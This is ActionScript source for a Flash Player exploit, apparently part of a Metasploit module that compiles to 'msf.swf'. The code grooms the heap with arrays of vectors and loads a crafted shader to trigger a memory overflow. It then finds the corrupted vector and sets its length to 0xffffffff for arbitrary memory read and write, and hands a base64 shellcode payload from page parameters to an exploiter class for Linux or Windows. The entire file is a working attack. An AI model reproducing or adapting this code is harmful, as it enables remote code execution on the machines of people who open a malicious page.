//compile with AIR SDK 13.0: mxmlc Exploit.as -o msf.swf
// It uses original code from @hdarwin89 for exploitation using ba's and vectors 

package {
	import flash.display.Sprite
	import flash.utils.ByteArray
	import flash.display.Shader
	import flash.system.Capabilities
	import flash.utils.Endian
	import __AS3__.vec.Vector
	import __AS3__.vec.*
	import flash.display.LoaderInfo
    import mx.utils.Base64Decoder
	
	public class Exploit extends Sprite {
		
		protected var Shad:Class
		private var uv:Vector.<uint>
        private var b64:Base64Decoder = new Base64Decoder()
        private var payload:ByteArray
        private var platform:String
        private var os:String
    	private var exploiter:Exploiter
		
		public function Exploit(){
            platform = LoaderInfo(this.root.loaderInfo).parameters.pl
            os = LoaderInfo(this.root.loaderInfo).parameters.os
            var b64_payload:String = LoaderInfo(this.root.loaderInfo).parameters.sh
            var pattern:RegExp = / /g;
            b64_payload = b64_payload.replace(pattern, "+")
            b64.decode(b64_payload)
            payload = b64.toByteArray()
            
            var shader:Shader
            if (platform == "linux") {
                this.Shad = GraphShadLinux
            } else {
                this.Shad = GraphShadWindows
            }
                        
			super()
			var i:* = 0
			var j:* = 0
			var offset:int = -1
			var corrupted_vector_idx:int = -1
            						
			// Memory massage
			var array_length:uint = 0x10000
			var vector_size:uint = 34
			var array:Array = new Array()

			i = 0
			while (i < array_length)
			{
				array[i] = new Vector.<uint>(vector_size)
				i++;
			}
			
			i = 0
			while (i < array_length)
			{
				array[i].length = 0
				i++
			}
			
			i = 0x0200
			while (i < array_length)
			{
				array[(i - (2 * (j % 2)))].length = 0x0100
				array[(i - (2 * (j % 2)))][0] = 0xdeedbeef
				array[(i - (2 * (j % 2)))][2] = (i - (2 * (j % 2)))
				i = (i + 28)
				j++
			}
			
			// Overflow and Search for corrupted vector
			var shadba:ByteArray = (new this.Shad() as ByteArray)
			shadba.position = 0
			
			shader = new Shader()
			try
			{
				shader.byteCode = (new this.Shad() as ByteArray);
			} catch(e) { }
			
			i = 0
			while (i < array_length)
			{
				if (array[i].length > 0x0100)
				{
					corrupted_vector_idx = i
					break
				}
				i++
			}
			
			if (corrupted_vector_idx == -1) {
				return
			}
			
			for(i = 0; i < array[corrupted_vector_idx].length; i++) {
				if (array[corrupted_vector_idx][i] == 0x0100 && array[corrupted_vector_idx][i + 2] == 0xdeedbeef) {
					array[corrupted_vector_idx][i] = 0xffffffff
					offset = i
					break
				}
			}
			
			if (offset == -1) {
				return
			}


			for(i = 0; i < array.length; i++) {
				if (array[i].length == 0xffffffff) {
					uv = array[i]
					uv[0x3ffffffc - offset] = 34
				}
			}

            for(i = 0; i < array.length; i++) {
                if (array[i].length != 0xffffffff) {
                    delete(array[i])
                    array[i] = null
                }
            }

            exploiter = new Exploiter(this, platform, os, payload, uv)
		}
	}
}